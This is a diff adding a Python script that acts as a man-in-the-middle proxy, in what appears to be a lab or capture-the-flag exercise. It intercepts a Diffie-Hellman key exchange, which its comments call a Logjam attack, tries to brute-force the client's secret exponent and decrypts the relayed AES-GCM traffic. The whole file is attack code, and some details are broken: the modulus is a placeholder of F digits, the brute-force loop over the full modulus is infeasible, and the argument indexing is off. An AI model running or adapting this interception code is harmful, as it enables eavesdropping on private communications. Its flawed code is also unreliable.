@@ -1,0 +1,89 @@
+#!/usr/bin/env python3
+import sys
+import socket
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+from hashlib import sha256
+
+# Weak Diffie-Hellman parameters for Logjam attack
+g = 2
+p = int("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 16)
+def recvall(sock, n):
+    data = b""
+    while len(data) < n:
+        packet = sock.recv(n - len(data))
+        if not packet:
+            break
+        data += packet
+    return data
+
+def brute_force_key(g, A, p):
+    for x in range(p):
+        if pow(g, x, p) == A:
+            return x
+    return None  
+
+def decrypt_and_write(data, key):
+    nonce = data[:16]
+    tag = data[16:32]
+    ciphertext = data[32:]
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    padded_plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+    plaintext = unpad(padded_plaintext, 16)
+    sys.stdout.buffer.write(plaintext)
+    sys.stdout.buffer.flush()
+
+def dh_proxy(listen_port, server_ip, server_port):
+
+    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    listen_sock.bind(('', listen_port))
+    listen_sock.listen(1)
+    client_conn, client_addr = listen_sock.accept()
+
+    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_sock.connect((server_ip, server_port))
+
+    # Intercept DH exchange
+    client_pub_bytes = recvall(client_conn, 384)  
+    server_sock.sendall(client_pub_bytes)         
+
+    server_pub_bytes = recvall(server_sock, 384)  
+    client_conn.sendall(server_pub_bytes)         
+
+    client_public = int(client_pub_bytes.decode('utf-8'))
+    server_public = int(server_pub_bytes.decode('utf-8'))
+
+    # Compute the client's private exponent and shared secret
+    x = brute_force_key(g, client_public, p)
+    
+    shared_secret = pow(server_public, x, p)
+    shared_secret_hex = '%x' % shared_secret
+    key = sha256(shared_secret_hex.encode('utf-8')).digest()
+
+    # Handle data from client to server
+    while True:
+        header = recvall(client_conn, 2)
+        if len(header) < 2:
+            break 
+        total_len = int.from_bytes(header, 'big')
+        data = recvall(client_conn, total_len)
+        if len(data) < total_len:
+            break  
+
+        server_sock.sendall(header)
+        server_sock.sendall(data)
+
+        decrypt_and_write(data, key)
+
+    client_conn.close()
+    server_sock.close()
+    listen_sock.close()
+
+def main():
+    listen_port = int(sys.argv[2])
+    server_ip = sys.argv[3]
+    server_port = int(sys.argv[4])
+    dh_proxy(listen_port, server_ip, server_port)
+
+if __name__ == "__main__":
+    main()
